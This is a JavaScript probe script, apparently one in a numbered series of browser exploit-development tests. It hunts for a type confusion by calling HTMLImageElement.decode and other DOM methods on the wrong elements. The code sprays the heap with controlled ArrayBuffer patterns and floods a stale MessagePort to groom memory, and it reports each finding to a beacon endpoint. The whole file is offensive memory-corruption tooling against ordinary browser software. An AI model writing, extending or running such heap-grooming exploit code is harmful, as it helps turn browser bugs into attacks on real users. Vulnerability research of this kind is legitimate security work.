// p115-decode-xproto.js — Deep dive on HTMLImageElement.decode type confusion
//
// p114 E6 found: HTMLImageElement.prototype.decode.call(div) returned OK
// (no TypeError) while ALL other cross-proto calls threw TypeError.
// If decode()'s binding doesn't validate |this|, it's calling C++
// HTMLImageElement::decode() on an HTMLDivElement → type confusion.
//
// Also: expanded cross-proto fuzzing, Range extractContents across
// shadow boundary, and stale port serialization heap grooming.
//
// Beacon prefix: V115D-

(function(){
var RUN = 'v115d' + Math.random().toString(36).slice(2,14);
var BC = '/beacon/V115D-';

function send(tag, data) {
    var body = JSON.stringify({r: RUN, b: typeof data === 'string' ? data : JSON.stringify(data)});
    try { navigator.sendBeacon(BC + tag, body); } catch(e) {}
}

var hb = setInterval(function(){ send('HB','hb'); }, 5000);

setTimeout(function() {
    send('L', 'probe115-start');

    // ═══════════════════════════════════════════════════════════════
    // D1: decode() on div — deep probe
    // Does the returned Promise resolve, reject, or hang?
    // What does the C++ code actually access?
    // ═══════════════════════════════════════════════════════════════
    setTimeout(function() {
        try {
            var div = document.createElement('div');
            document.body.appendChild(div);

            var d1_syncErr = null;
            var d1_result = null;
            var d1_promiseType = '';

            try {
                var p = HTMLImageElement.prototype.decode.call(div);
                d1_promiseType = (p && typeof p.then === 'function') ? 'Promise' : typeof p;

                p.then(function(val) {
                    d1_result = 'RESOLVED:' + String(val);
                    send('D1-DECODE-DIV', {
                        syncErr: null, promiseType: d1_promiseType,
                        result: d1_result
                    });
                }).catch(function(err) {
                    d1_result = 'REJECTED:' + err.constructor.name + ':' + err.message.slice(0,80);
                    send('D1-DECODE-DIV', {
                        syncErr: null, promiseType: d1_promiseType,
                        result: d1_result
                    });
                });
            } catch(se) {
                d1_syncErr = se.constructor.name + ':' + se.message.slice(0,80);
                send('D1-DECODE-DIV', {syncErr: d1_syncErr, promiseType: 'N/A', result: 'SYNC_THROW'});
            }

            // Fallback beacon if promise never settles
            setTimeout(function() {
                if (!d1_result && !d1_syncErr) {
                    send('D1-DECODE-DIV', {syncErr: null, promiseType: d1_promiseType, result: 'TIMEOUT_UNSETTLED'});
                }
            }, 2000);
        } catch(e) {
            send('D1-DECODE-DIV', {err: 'OUTER:' + e.constructor.name});
        }
    }, 100);

    // ═══════════════════════════════════════════════════════════════
    // D2: decode() on multiple wrong element types
    // Test canvas, span, input, textarea, video, audio, a, form
    // ═══════════════════════════════════════════════════════════════
    setTimeout(function() {
        try {
            var types = ['canvas', 'span', 'input', 'textarea', 'a', 'form', 'table', 'select', 'button', 'pre'];
            var results = [];

            function testDecode(tagName, cb) {
                var el = document.createElement(tagName);
                document.body.appendChild(el);
                try {
                    var p = HTMLImageElement.prototype.decode.call(el);
                    if (p && typeof p.then === 'function') {
                        p.then(function() {
                            results.push(tagName + ':RESOLVED');
                            cb();
                        }).catch(function(e) {
                            results.push(tagName + ':REJECTED:' + e.constructor.name);
                            cb();
                        });
                    } else {
                        results.push(tagName + ':NOT_PROMISE:' + typeof p);
                        cb();
                    }
                } catch(e) {
                    results.push(tagName + ':SYNC_THROW:' + e.constructor.name);
                    cb();
                }
            }

            var idx = 0;
            function next() {
                if (idx < types.length) {
                    testDecode(types[idx++], next);
                } else {
                    send('D2-DECODE-TYPES', {results: results.join('|')});
                }
            }
            next();

            setTimeout(function() {
                if (results.length < types.length) {
                    send('D2-DECODE-TYPES', {results: results.join('|'), partial: true, got: results.length});
                }
            }, 3000);
        } catch(e) {
            send('D2-DECODE-TYPES', {err: 'OUTER:' + e.constructor.name});
        }
    }, 500);

    // ═══════════════════════════════════════════════════════════════
    // D3: decode() on div with image-like properties set
    // Set src, width, height, complete etc. on div before calling
    // decode(). Does the C++ code read these wrong-offset fields?
    // ═══════════════════════════════════════════════════════════════
    setTimeout(function() {
        try {
            var div = document.createElement('div');
            div.setAttribute('src', 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==');
            div.setAttribute('width', '100');
            div.setAttribute('height', '100');
            div.setAttribute('crossorigin', 'anonymous');
            document.body.appendChild(div);

            var d3_result = '';
            try {
                var p = HTMLImageElement.prototype.decode.call(div);
                p.then(function() {
                    d3_result = 'RESOLVED';
                    send('D3-DECODE-IMGATTRS', {result: d3_result});
                }).catch(function(e) {
                    d3_result = 'REJECTED:' + e.constructor.name + ':' + e.message.slice(0,80);
                    send('D3-DECODE-IMGATTRS', {result: d3_result});
                });
            } catch(se) {
                d3_result = 'SYNC:' + se.constructor.name;
                send('D3-DECODE-IMGATTRS', {result: d3_result});
            }

            setTimeout(function() {
                if (!d3_result) send('D3-DECODE-IMGATTRS', {result: 'TIMEOUT'});
            }, 2000);
        } catch(e) {
            send('D3-DECODE-IMGATTRS', {err: 'OUTER:' + e.constructor.name});
        }
    }, 1200);

    // ═══════════════════════════════════════════════════════════════
    // D4: HTMLImageElement property access on div via .call()
    // Test complete, naturalWidth, naturalHeight, currentSrc, src
    // as getters — do they read wrong memory offsets?
    // ═══════════════════════════════════════════════════════════════
    setTimeout(function() {
        try {
            var div = document.createElement('div');
            div.id = 'd4-test';
            document.body.appendChild(div);

            var imgProto = HTMLImageElement.prototype;
            var results = [];

            function tryGetter(name) {
                try {
                    var desc = Object.getOwnPropertyDescriptor(imgProto, name);
                    if (!desc) {
                        desc = Object.getOwnPropertyDescriptor(Object.getPrototypeOf(imgProto), name);
                    }
                    if (desc && desc.get) {
                        var val = desc.get.call(div);
                        results.push(name + ':OK:' + String(val).slice(0,30));
                    } else {
                        results.push(name + ':NO_GETTER');
                    }
                } catch(e) {
                    results.push(name + ':' + e.constructor.name);
                }
            }

            var props = ['complete', 'naturalWidth', 'naturalHeight', 'currentSrc',
                         'src', 'width', 'height', 'alt', 'crossOrigin', 'loading',
                         'decoding', 'isMap', 'useMap', 'x', 'y'];

            for (var i = 0; i < props.length; i++) tryGetter(props[i]);

            // Also try calling load() on div
            try {
                var loadResult = HTMLImageElement.prototype.hasOwnProperty('load') ? 'has' : 'none';
                if (HTMLImageElement.prototype.load) {
                    HTMLImageElement.prototype.load.call(div);
                    results.push('load:OK');
                }
            } catch(le) {
                results.push('load:' + le.constructor.name);
            }

            send('D4-IMG-GETTERS', {results: results.join('|')});
        } catch(e) {
            send('D4-IMG-GETTERS', {err: 'OUTER:' + e.constructor.name});
        }
    }, 2000);

    // ═══════════════════════════════════════════════════════════════
    // D5: Expanded cross-proto fuzzing — more DOM interfaces
    // Test every method we can find that might skip |this| check
    // ═══════════════════════════════════════════════════════════════
    setTimeout(function() {
        try {
            var div = document.createElement('div');
            document.body.appendChild(div);
            var canvas = document.createElement('canvas');
            canvas.width = 10; canvas.height = 10;
            document.body.appendChild(canvas);

            var results = [];
            function tryCall(name, fn) {
                try {
                    fn();
                    results.push(name + ':OK');
                } catch(e) {
                    results.push(name + ':' + e.constructor.name);
                }
            }

            // HTMLMediaElement methods on div (video/audio methods)
            if (typeof HTMLVideoElement !== 'undefined') {
                tryCall('video-play-on-div', function() {
                    HTMLVideoElement.prototype.play.call(div);
                });
                tryCall('video-pause-on-div', function() {
                    HTMLVideoElement.prototype.pause.call(div);
                });
                tryCall('video-load-on-div', function() {
                    HTMLVideoElement.prototype.load.call(div);
                });
            }

            // HTMLAnchorElement methods
            tryCall('a-toString-on-div', function() {
                HTMLAnchorElement.prototype.toString.call(div);
            });

            // HTMLFormElement
            tryCall('form-submit-on-div', function() {
                HTMLFormElement.prototype.submit.call(div);
            });
            tryCall('form-reset-on-div', function() {
                HTMLFormElement.prototype.reset.call(div);
            });
            tryCall('form-checkValidity-on-div', function() {
                HTMLFormElement.prototype.checkValidity.call(div);
            });

            // HTMLSelectElement
            tryCall('select-add-on-div', function() {
                HTMLSelectElement.prototype.add.call(div, document.createElement('option'));
            });
            tryCall('select-remove-on-div', function() {
                HTMLSelectElement.prototype.remove.call(div, 0);
            });

            // HTMLTableElement
            tryCall('table-createTBody-on-div', function() {
                HTMLTableElement.prototype.createTBody.call(div);
            });
            tryCall('table-insertRow-on-div', function() {
                HTMLTableElement.prototype.insertRow.call(div);
            });
            tryCall('table-deleteRow-on-div', function() {
                HTMLTableElement.prototype.deleteRow.call(div, 0);
            });

            // HTMLElement slot/dataset on canvas
            tryCall('slot-get-on-canvas', function() {
                var desc = Object.getOwnPropertyDescriptor(HTMLElement.prototype, 'slot');
                if (desc && desc.get) desc.get.call(canvas);
            });

            // attachShadow on something that already has one
            tryCall('shadow-on-shadow', function() {
                var host = document.createElement('div');
                host.attachShadow({mode: 'open'});
                host.attachShadow({mode: 'open'});
            });

            // SVGElement methods on HTML elements
            if (typeof SVGSVGElement !== 'undefined') {
                tryCall('svg-createSVGRect-on-div', function() {
                    var svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
                    SVGSVGElement.prototype.createSVGRect.call(div);
                });
                tryCall('svg-getScreenCTM-on-div', function() {
                    var svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
                    svg.getScreenCTM.call(div);
                });
            }

            // CharacterData methods on Element
            tryCall('chardata-substringData-on-div', function() {
                CharacterData.prototype.substringData.call(div, 0, 1);
            });
            tryCall('chardata-appendData-on-div', function() {
                CharacterData.prototype.appendData.call(div, 'test');
            });

            // Document methods on Element
            tryCall('doc-createElement-on-div', function() {
                Document.prototype.createElement.call(div, 'span');
            });
            tryCall('doc-createRange-on-div', function() {
                Document.prototype.createRange.call(div);
            });

            var okResults = results.filter(function(r) { return r.indexOf(':OK') !== -1; });

            send('D5-XPROTO-DEEP', {
                total: results.length,
                okCount: okResults.length,
                interesting: okResults.join('|'),
                all: results.join('|')
            });
        } catch(e) {
            send('D5-XPROTO-DEEP', {err: 'OUTER:' + e.constructor.name});
        }
    }, 2800);

    // ═══════════════════════════════════════════════════════════════
    // D6: Range extractContents across shadow boundary
    // p114 E11 showed Range.setEnd into shadow SUCCEEDED.
    // Now test extractContents on that cross-shadow range.
    // ═══════════════════════════════════════════════════════════════
    setTimeout(function() {
        try {
            var host = document.createElement('div');
            host.textContent = 'before shadow';
            document.body.appendChild(host);
            var shadow = host.attachShadow({mode: 'open'});
            shadow.innerHTML = '<p>AAA</p><p>BBB</p><p>CCC</p>';

            var d6_results = {};

            // Test 1: Range with setEnd inside shadow
            try {
                var range1 = document.createRange();
                range1.setStartBefore(host);
                range1.setEnd(shadow.querySelector('p:last-child'), 1);
                d6_results.rangeCreated = true;
                d6_results.collapsed = range1.collapsed;
                d6_results.startContainer = range1.startContainer.nodeName;
                d6_results.endContainer = range1.endContainer.nodeName;

                try {
                    var frag = range1.extractContents();
                    d6_results.extractOk = true;
                    d6_results.fragChildren = frag.childNodes.length;
                    d6_results.fragText = frag.textContent.slice(0,50);
                } catch(ee) {
                    d6_results.extractErr = ee.constructor.name + ':' + ee.message.slice(0,60);
                }

                try {
                    var frag2 = range1.cloneContents();
                    d6_results.cloneOk = true;
                    d6_results.cloneChildren = frag2.childNodes.length;
                } catch(ce) {
                    d6_results.cloneErr = ce.constructor.name;
                }
            } catch(re) {
                d6_results.rangeErr = re.constructor.name + ':' + re.message.slice(0,60);
            }

            // Test 2: Range entirely within shadow
            try {
                var range2 = document.createRange();
                range2.setStart(shadow.querySelector('p'), 0);
                range2.setEnd(shadow.querySelector('p:last-child'), 1);
                d6_results.shadowRangeOk = true;
                var frag3 = range2.extractContents();
                d6_results.shadowExtractOk = true;
                d6_results.shadowFragChildren = frag3.childNodes.length;
            } catch(se) {
                d6_results.shadowRangeErr = se.constructor.name;
            }

            // Test 3: deleteContents on cross-shadow range
            try {
                var host2 = document.createElement('div');
                document.body.appendChild(host2);
                var shadow2 = host2.attachShadow({mode: 'open'});
                shadow2.innerHTML = '<p>XXX</p><p>YYY</p>';

                var range3 = document.createRange();
                range3.setStartBefore(host2);
                range3.setEnd(shadow2.querySelector('p:last-child'), 1);
                range3.deleteContents();
                d6_results.deleteOk = true;
                d6_results.hostAfterDelete = host2.parentNode ? 'inDOM' : 'removed';
                d6_results.shadowAfterDelete = shadow2.childNodes.length;
            } catch(de) {
                d6_results.deleteErr = de.constructor.name + ':' + de.message.slice(0,60);
            }

            send('D6-SHADOWRANGE', d6_results);
        } catch(e) {
            send('D6-SHADOWRANGE', {err: 'OUTER:' + e.constructor.name});
        }
    }, 3600);

    // ═══════════════════════════════════════════════════════════════
    // D7: decode() combined with heap grooming
    // If decode() truly has type confusion, combine with .set()
    // heap grooming. Allocate controlled data where image internals
    // would be read from.
    // ═══════════════════════════════════════════════════════════════
    setTimeout(function() {
        try {
            var results = {};

            // Create a div and spray adjacent memory with controlled pattern
            var spray = [];
            for (var i = 0; i < 100; i++) {
                var ab = new ArrayBuffer(256);
                new Uint8Array(ab).fill(0x41);
                spray.push(ab);
            }

            var div = document.createElement('div');
            document.body.appendChild(div);

            // More spray after div creation
            for (var j = 0; j < 100; j++) {
                var ab2 = new ArrayBuffer(256);
                new Uint8Array(ab2).fill(0x42);
                spray.push(ab2);
            }

            // Now call decode — if type confusion, C++ reads wrong offsets
            // which might now contain 0x41/0x42 patterns
            try {
                var p = HTMLImageElement.prototype.decode.call(div);
                results.syncOk = true;

                p.then(function() {
                    results.promiseResult = 'RESOLVED';
                    send('D7-DECODE-GROOM', results);
                }).catch(function(e) {
                    results.promiseResult = 'REJECTED:' + e.constructor.name + ':' + e.message.slice(0,80);
                    send('D7-DECODE-GROOM', results);
                });
            } catch(se) {
                results.syncErr = se.constructor.name + ':' + se.message.slice(0,60);
                send('D7-DECODE-GROOM', results);
            }

            setTimeout(function() {
                if (!results.promiseResult && !results.syncErr) {
                    results.promiseResult = 'TIMEOUT';
                    send('D7-DECODE-GROOM', results);
                }
            }, 2000);

            // Also test: create img, transfer its src buffer idea via decode on div
            // after img is loaded
            var img = document.createElement('img');
            img.src = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==';
            img.onload = function() {
                try {
                    // Swap prototypes: make img look like div, make div look like img
                    var imgDecodeResult = '';
                    try {
                        // Set div's __proto__ to img's constructor prototype
                        Object.setPrototypeOf(div, HTMLImageElement.prototype);
                        var p2 = div.decode();
                        p2.then(function() {
                            imgDecodeResult = 'PROTO_SWAP_RESOLVED';
                            send('D7b-PROTOSWAP', {result: imgDecodeResult});
                        }).catch(function(e) {
                            imgDecodeResult = 'PROTO_SWAP_REJECTED:' + e.constructor.name + ':' + e.message.slice(0,60);
                            send('D7b-PROTOSWAP', {result: imgDecodeResult});
                        });
                    } catch(pse) {
                        send('D7b-PROTOSWAP', {result: 'SYNC:' + pse.constructor.name + ':' + pse.message.slice(0,60)});
                    }
                } catch(oe) {
                    send('D7b-PROTOSWAP', {err: 'OUTER:' + oe.constructor.name});
                }
            };
            document.body.appendChild(img);

        } catch(e) {
            send('D7-DECODE-GROOM', {err: 'OUTER:' + e.constructor.name});
        }
    }, 4400);

    // ═══════════════════════════════════════════════════════════════
    // D8: Stale MessagePort as serialization heap grooming
    // Rapid postMessage on stale port — does serialization allocate
    // and then free when port is found dead? Test with large objects.
    // ═══════════════════════════════════════════════════════════════
    setTimeout(function() {
        try {
            var mc = new MessageChannel();
            var port1 = mc.port1;
            var port2 = mc.port2;

            // Transfer port1 to a worker
            var wCode = 'onmessage=function(e){if(e.ports[0])e.ports[0].close();};';
            var w = new Worker(URL.createObjectURL(new Blob([wCode], {type: 'application/javascript'})));
            w.postMessage({}, [port1]);

            // Now rapid-fire large messages on stale port
            var d8_ok = 0;
            var d8_err = 0;
            var d8_errTypes = {};

            setTimeout(function() {
                for (var i = 0; i < 100; i++) {
                    try {
                        // Large structured data → forces serialization allocation
                        var big = {
                            a: new Array(1000).fill('AAAA'),
                            b: new ArrayBuffer(4096),
                            c: i
                        };
                        port1.postMessage(big);
                        d8_ok++;
                    } catch(e) {
                        d8_err++;
                        d8_errTypes[e.constructor.name] = (d8_errTypes[e.constructor.name] || 0) + 1;
                    }
                }

                // Transfer attempt on stale port
                var d8_transferResult = '';
                try {
                    var ab = new ArrayBuffer(256);
                    port1.postMessage({buf: ab}, [ab]);
                    d8_transferResult = 'OK:bufDetached=' + (ab.byteLength === 0);
                } catch(te) {
                    d8_transferResult = te.constructor.name + ':' + te.message.slice(0,60);
                }

                send('D8-STALESERIAL', {
                    ok: d8_ok, err: d8_err,
                    errTypes: JSON.stringify(d8_errTypes),
                    transferResult: d8_transferResult
                });
                w.terminate();
            }, 200);
        } catch(e) {
            send('D8-STALESERIAL', {err: 'OUTER:' + e.constructor.name});
        }
    }, 5200);

    // ═══════════════════════════════════════════════════════════════
    // D9: Video/Audio element decode confusion
    // HTMLMediaElement has complex internal state. Call media
    // methods on wrong element types.
    // ═══════════════════════════════════════════════════════════════
    setTimeout(function() {
        try {
            var results = [];
            var div = document.createElement('div');
            document.body.appendChild(div);

            function tryMedia(name, fn) {
                try {
                    fn();
                    results.push(name + ':OK');
                } catch(e) {
                    results.push(name + ':' + e.constructor.name);
                }
            }

            // HTMLMediaElement getters on div
            var mediaGetters = ['currentTime', 'duration', 'paused', 'ended', 'volume',
                               'muted', 'playbackRate', 'readyState', 'networkState',
                               'buffered', 'seekable', 'played', 'currentSrc', 'src',
                               'preload', 'autoplay', 'loop', 'controls'];

            var mediaProto = HTMLVideoElement ? HTMLVideoElement.prototype :
                            (HTMLAudioElement ? HTMLAudioElement.prototype : null);

            if (mediaProto) {
                for (var i = 0; i < mediaGetters.length; i++) {
                    (function(prop) {
                        tryMedia('media-get-' + prop, function() {
                            var desc = null;
                            var p = mediaProto;
                            while (p && !desc) {
                                desc = Object.getOwnPropertyDescriptor(p, prop);
                                p = Object.getPrototypeOf(p);
                            }
                            if (desc && desc.get) {
                                var val = desc.get.call(div);
                                results[results.length - 1] = 'media-get-' + prop + ':OK:' + String(val).slice(0,20);
                            } else {
                                results[results.length - 1] = 'media-get-' + prop + ':NO_GETTER';
                            }
                        });
                    })(mediaGetters[i]);
                }

                // Media methods
                tryMedia('media-play', function() { mediaProto.play.call(div); });
                tryMedia('media-pause', function() { mediaProto.pause.call(div); });
                tryMedia('media-load', function() { mediaProto.load.call(div); });
                tryMedia('media-canPlayType', function() { mediaProto.canPlayType.call(div, 'video/mp4'); });
            }

            var okResults = results.filter(function(r) { return r.indexOf(':OK') !== -1; });

            send('D9-MEDIACONF', {
                total: results.length,
                okCount: okResults.length,
                interesting: okResults.join('|'),
                allTruncated: results.slice(0, 30).join('|')
            });
        } catch(e) {
            send('D9-MEDIACONF', {err: 'OUTER:' + e.constructor.name});
        }
    }, 6000);

    // ═══════════════════════════════════════════════════════════════
    // D10: Object.create + method dispatch deep test
    // Create objects with wrong prototype, try to use them as real
    // DOM nodes in operations that expect specific internal state.
    // ═══════════════════════════════════════════════════════════════
    setTimeout(function() {
        try {
            var results = [];

            // Fake image
            var fakeImg = Object.create(HTMLImageElement.prototype);
            try {
                var p = fakeImg.decode();
                p.then(function() { results.push('fakeImg-decode:RESOLVED'); })
                 .catch(function(e) { results.push('fakeImg-decode:REJECTED:' + e.constructor.name); });
            } catch(e) { results.push('fakeImg-decode:' + e.constructor.name); }

            // Fake canvas
            var fakeCanvas = Object.create(HTMLCanvasElement.prototype);
            try { fakeCanvas.getContext('2d'); results.push('fakeCanvas-getCtx:OK'); }
            catch(e) { results.push('fakeCanvas-getCtx:' + e.constructor.name); }
            try { fakeCanvas.toDataURL(); results.push('fakeCanvas-toDataURL:OK'); }
            catch(e) { results.push('fakeCanvas-toDataURL:' + e.constructor.name); }

            // Fake range
            var fakeRange = Object.create(Range.prototype);
            try { fakeRange.setStart(document.body, 0); results.push('fakeRange-setStart:OK'); }
            catch(e) { results.push('fakeRange-setStart:' + e.constructor.name); }

            // Fake document
            var fakeDoc = Object.create(Document.prototype);
            try { fakeDoc.createElement('div'); results.push('fakeDoc-createElement:OK'); }
            catch(e) { results.push('fakeDoc-createElement:' + e.constructor.name); }

            // Fake MutationObserver
            try {
                var fakeMO = Object.create(MutationObserver.prototype);
                fakeMO.observe(document.body, {childList: true});
                results.push('fakeMO-observe:OK');
            } catch(e) { results.push('fakeMO-observe:' + e.constructor.name); }

            // Fake MessagePort
            try {
                var fakePort = Object.create(MessagePort.prototype);
                fakePort.postMessage({test: true});
                results.push('fakePort-postMessage:OK');
            } catch(e) { results.push('fakePort-postMessage:' + e.constructor.name); }

            // Fake Worker
            try {
                var fakeWorker = Object.create(Worker.prototype);
                fakeWorker.postMessage({test: true});
                results.push('fakeWorker-postMessage:OK');
            } catch(e) { results.push('fakeWorker-postMessage:' + e.constructor.name); }

            setTimeout(function() {
                var okResults = results.filter(function(r) { return r.indexOf(':OK') !== -1 || r.indexOf(':RESOLVED') !== -1; });
                send('D10-FAKEOBJ', {
                    total: results.length,
                    okCount: okResults.length,
                    interesting: okResults.join('|'),
                    all: results.join('|')
                });
            }, 1000);
        } catch(e) {
            send('D10-FAKEOBJ', {err: 'OUTER:' + e.constructor.name});
        }
    }, 6800);

    // ═══════════════════════════════════════════════════════════════
    // DONE beacon
    // ═══════════════════════════════════════════════════════════════
    setTimeout(function() {
        clearInterval(hb);
        send('Z', 'probe115-done');
    }, 9500);

}, 300);
})();
